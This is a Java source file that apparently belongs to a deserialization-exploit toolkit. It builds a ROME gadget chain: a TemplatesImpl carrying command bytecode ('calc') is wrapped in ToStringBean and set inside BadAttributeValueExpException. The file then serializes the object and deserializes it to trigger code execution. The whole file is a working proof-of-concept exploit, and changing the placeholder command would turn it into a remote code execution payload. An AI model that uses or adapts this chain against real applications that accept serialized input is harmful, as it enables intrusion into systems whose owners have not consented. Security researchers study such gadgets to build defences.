package Seri.RomeGadgets;

import Seri.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static Seri.Utils.*;

public class BAVEERome {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc");

        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(new Object());
        setValue(badAttributeValueExpException,"val",toStringBean);

        serialize(badAttributeValueExpException ,"bin/BAVEERome.bin");
        unserialize("bin/BAVEERome.bin");

    }
}
